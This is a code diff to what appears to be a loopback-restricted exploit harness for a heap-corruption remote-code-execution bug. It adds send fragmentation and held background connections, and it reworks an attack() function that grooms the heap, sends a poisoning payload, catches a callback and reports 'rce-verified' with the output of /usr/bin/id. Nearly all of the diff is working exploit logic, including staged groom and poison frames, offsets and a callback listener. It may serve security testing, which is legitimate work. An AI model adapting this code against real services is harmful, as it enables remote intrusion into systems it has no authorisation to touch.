@@ -8,6 +8,7 @@ by `/usr/bin/id`.  It has no arbitrary target, command, or callback option.
 from __future__ import annotations
 
 from dataclasses import dataclass
+from contextlib import ExitStack
 import importlib.util
 from pathlib import Path
 import re
@@ -89,6 +90,31 @@ def _connect(timeout: float) -> socket.socket:
         raise RuntimeError(f"refusing non-loopback peer: {peer}")
     connection.settimeout(timeout)
     return connection
+
+
+def send_fragmented(connection: socket.socket, data: bytes, fragment_size: int) -> None:
+    if fragment_size == 0:
+        connection.sendall(data)
+        return
+    if not 1 <= fragment_size <= 4096:
+        raise ValueError("fragment size must be zero or between 1 and 4096")
+    for offset in range(0, len(data), fragment_size):
+        connection.sendall(data[offset : offset + fragment_size])
+
+
+def hold_background_connections(
+    stack: ExitStack, count: int, timeout: float
+) -> list[socket.socket]:
+    """Hold bounded, incomplete benign frames to model concurrent clients."""
+
+    if not 0 <= count <= 8:
+        raise ValueError("background connection count must be between 0 and 8")
+    held: list[socket.socket] = []
+    for _ in range(count):
+        connection = stack.enter_context(_connect(timeout))
+        connection.sendall(struct.pack(">I", 1))
+        held.append(connection)
+    return held
 
 
 def receive_line(connection: socket.socket, limit: int = 256) -> bytes:
@@ -207,34 +233,50 @@ def verify_proof(token: str, proof: bytes, peer: str) -> str:
     return identity
 
 
-def attack(profile: HeapProfile, timeout: float = 8.0) -> dict[str, object]:
+def attack(
+    profile: HeapProfile,
+    timeout: float = 8.0,
+    *,
+    background_connections: int = 0,
+    fragment_size: int = 0,
+) -> dict[str, object]:
     profile.validate()
+    if not 0 <= background_connections <= 8:
+        raise ValueError("background connection count must be between 0 and 8")
+    if fragment_size != 0 and not 1 <= fragment_size <= 4096:
+        raise ValueError("fragment size must be zero or between 1 and 4096")
     token = "N2S_" + secrets.token_hex(16)
     proof_payload = build_fixed_proof(profile, token)
     groom_first = stage_one(0x0003000000030000, 0xFFFFFF)
     poison_first = stage_one(profile.bss_payload, 0xFFBF10, proof_payload)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
+    with ExitStack() as stack:
+        hold_background_connections(stack, background_connections, timeout)
+        listener = stack.enter_context(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((CALLBACK_HOST, CALLBACK_PORT))
         listener.listen(1)
         listener.settimeout(timeout)
-        with _connect(timeout) as groom:
-            groom.sendall(framed(groom_first))
-            if receive_line(groom) != b"ACK\n":
-                raise RuntimeError("groom stage was not acknowledged")
-            groom.sendall(framed(stage_two(-1, 127)))
-            if len(receive_at_least(groom, 16384, 65536)) < 16384:
-                raise RuntimeError("groom output was too short")
-            with _connect(timeout) as exploit:
-                exploit.sendall(framed(poison_first))
-                if receive_line(exploit) != b"ACK\n":
-                    raise RuntimeError("poison stage was not acknowledged")
-                exploit.sendall(framed(stage_two(profile.poison_staged_position, 27)))
-                callback, peer = listener.accept()
-                with callback:
-                    callback.settimeout(min(timeout, 5.0))
-                    proof = receive_to_close(callback)
+        groom = stack.enter_context(_connect(timeout))
+        send_fragmented(groom, framed(groom_first), fragment_size)
+        if receive_line(groom) != b"ACK\n":
+            raise RuntimeError("groom stage was not acknowledged")
+        send_fragmented(groom, framed(stage_two(-1, 127)), fragment_size)
+        if len(receive_at_least(groom, 16384, 65536)) < 16384:
+            raise RuntimeError("groom output was too short")
+        exploit = stack.enter_context(_connect(timeout))
+        send_fragmented(exploit, framed(poison_first), fragment_size)
+        if receive_line(exploit) != b"ACK\n":
+            raise RuntimeError("poison stage was not acknowledged")
+        send_fragmented(
+            exploit,
+            framed(stage_two(profile.poison_staged_position, 27)),
+            fragment_size,
+        )
+        callback, peer = listener.accept()
+        with callback:
+            callback.settimeout(min(timeout, 5.0))
+            proof = receive_to_close(callback)
     identity = verify_proof(token, proof, peer[0])
     return {
         "result": "rce-verified",
@@ -243,4 +285,6 @@ def attack(profile: HeapProfile, timeout: float = 8.0) -> dict[str, object]:
         "proof_stdout": identity,
         "proof_channel": "fresh loopback callback",
         "callback_peer": peer[0],
+        "background_connections": background_connections,
+        "fragment_size": fragment_size,
     }
